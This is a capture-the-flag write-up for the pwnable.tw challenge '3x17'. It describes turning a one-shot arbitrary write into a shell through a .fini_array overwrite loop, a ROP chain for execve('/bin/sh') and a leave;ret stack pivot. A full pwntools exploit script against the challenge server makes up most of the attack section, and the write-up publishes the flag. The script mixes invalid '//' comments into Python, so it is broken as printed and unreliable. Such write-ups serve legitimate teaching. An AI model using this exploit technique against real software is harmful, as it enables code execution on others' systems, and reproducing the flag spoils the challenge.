# CTF Writeup: 3x17 (pwnable.tw)

##  Challenge Overview

You are provided with a single compiled binary file. When you run it, the program is incredibly simple. It asks you for two things:
addr:
data:
It will take whatever data you provide and write it to the memory address you specified. After completing this single write operation, the program terminates.
Your goal is to exploit this severely restricted write primitive to gain remote code execution, pop a shell, and read the flag on the server.

## Initial Analysis

### Basic Enumeration
Initial checks reveal the binary is a 64-bit ELF. It is statically linked and stripped, meaning it contains a massive amount of gadgets but lacks human-readable function names. Because the binary is stripped, we cannot simply look for main. We have to trace the execution from the raw Entry Point.

1. Find the Entry Point:
readelf -h 3x17 | grep "Entry point"
Result: 0x401a50

2. Disassemble _start to find main:
objdump -M intel -d 3x17 --start-address=0x401a50 | head -n 25
Looking at the arguments passed to __libc_start_main, we recover two critical addresses:
main is passed via RDI: 0x401b6d
__libc_csu_fini is passed via R8: 0x402960

3. Locate .fini_array:
readelf -S 3x17 | grep .fini_array
Result: 0x4b40f0

### Exploitation Strategy
Our goal is to execute the execve("/bin/sh", 0, 0) system call. Since the binary is statically linked, we have all the pop gadgets we need. However, our arbitrary write primitive only fires once before the program terminates. A standard execve ROP chain requires multiple writes.

Phase 1: The Infinite Loop

To bypass the single-write limitation, we target the .fini_array. This array holds pointers to cleanup functions that the program executes sequentially upon exiting, handled by __libc_csu_fini. By overwriting the first two entries of .fini_array with the addresses of __libc_csu_fini and main, we create an infinite loop:

Program exits and calls __libc_csu_fini.
__libc_csu_fini calls main (granting us another write).
main exits, triggering __libc_csu_fini again.

Phase 2: Building the ROP Chain

With infinite writes secured, we can slowly write our payload directly into the memory space immediately following the .fini_array.

The Arsenal:

pop rdi; ret: 0x401696
pop rsi; ret: 0x406c30
pop rdx; ret: 0x446e35
pop rax; ret: 0x41e4af
syscall: 0x4022b4

We arrange these to set RAX = 59 (execve), RDI = Address of "/bin/sh", RSI = 0, and RDX = 0.

Phase 3: The Stack Pivot

Once the ROP chain is fully written, we use our final write to overwrite the start of .fini_array with a leave ; ret gadget (0x401c4b). Because __libc_csu_fini stores the address of .fini_array in RBP, executing leave copies RBP into the Stack Pointer (RSP). The binary is tricked into thinking the .fini_array is the stack, seamlessly executing our injected ROP chain.

### Exploit Code
from pwn import *
from time import sleep

//Target Addresses

fini_array = 0x4b40f0
main_addr  = 0x401b6d
libc_csu   = 0x402960   
leave_ret  = 0x401c4b
ret        = leave_ret + 1 

//ROP Gadgets
pop_rdi = 0x00401696
pop_rsi = 0x00406c30
pop_rdx = 0x00446e35
pop_rax = 0x0041e4af
syscall = 0x004022b4

//Connect to target
print("[*] Connecting to chall.pwnable.tw:10105...")
p = remote('chall.pwnable.tw', 10105)

def write_val(address, data):
    p.sendlineafter(b"addr:", str(address).encode())
    p.sendafter(b"data:", data)

//Establish the Infinite Loop
print("[*] Creating infinite loop via .fini_array overwrite...")
write_val(fini_array, p64(libc_csu) + p64(main_addr))

//Write ROP chain to memory
print("[*] Writing ROP chain to memory...")
write_val(fini_array + 16, p64(pop_rdi))
write_val(fini_array + 24, p64(fini_array + 88)) # Pointer to /bin/sh string
write_val(fini_array + 32, p64(pop_rsi))
write_val(fini_array + 40, p64(0))               
write_val(fini_array + 48, p64(pop_rdx))
write_val(fini_array + 56, p64(0))               
write_val(fini_array + 64, p64(pop_rax))
write_val(fini_array + 72, p64(59))              # execve syscall (0x3b)
write_val(fini_array + 80, p64(syscall))         
write_val(fini_array + 88, b"/bin/sh\x00")       

//Stack Pivot
print("[*] Pivoting stack and executing payload...")
write_val(fini_array, p64(leave_ret) + p64(ret))

//Automate Flag Capture (Bypass Timeout)
print("[*] Payload sent! Waiting for shell to wake up...")
sleep(1) 

print("[*] Grabbing the flag...")
p.sendline(b"cat /home/3x17/the_4ns_is_51_fl4g")

print("[*] Ripping output from buffer:")
print(p.recvall(timeout=3).decode(errors='ignore'))

## Flag
FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
